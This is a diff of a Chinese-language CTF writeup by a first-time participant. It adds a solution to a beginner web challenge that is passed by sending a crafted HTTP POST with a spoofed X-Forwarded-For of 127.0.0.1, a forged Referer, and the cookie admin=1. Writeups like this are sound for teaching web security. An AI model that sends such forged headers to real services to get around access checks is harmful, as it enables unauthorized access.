@@ -2,6 +2,8 @@
 
 第一次参赛，第一次要写 writeup ，结果就搞错时间了😭😭😭误把 writeup ddl 当成计分 ddl ，结果就去浪了一天（由于体重原因被家人朋友强行拉去健身房）回来一看，把做了一半的题做完怎么不计分了。。。
 
+所以这次做的题太少了，下周一定不咕咕咕！反正过年期间都关了也没法进行什么活动。。。
+
 ## web
 
 ###　谁吃了我的flag [已完成]
@@ -16,3 +18,31 @@
 
 ![vimswap](./img/vimswap.png)
 ![vimswap](./img/vimflag.png)
+
+### 换头大作战[已完成]
+
+虽然积分时间已过，但是还是简单做了一下。
+
+这道题那可真是循循善诱、步步为营。难度不高但是特别长,按照提示一步一步修改请求即可。在我这里生效的请求为：
+
+```http
+
+POST /week1/how/index.php HTTP/1.1
+Host: 120.78.184.111:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Waterfox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: www.bilibili.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Connection: close
+Cookie: admin=1
+Upgrade-Insecure-Requests: 1
+X-Forwarded-For: 127.0.0.1
+
+want=1
+
+```
+
+![http-request](./img/http-request.png)
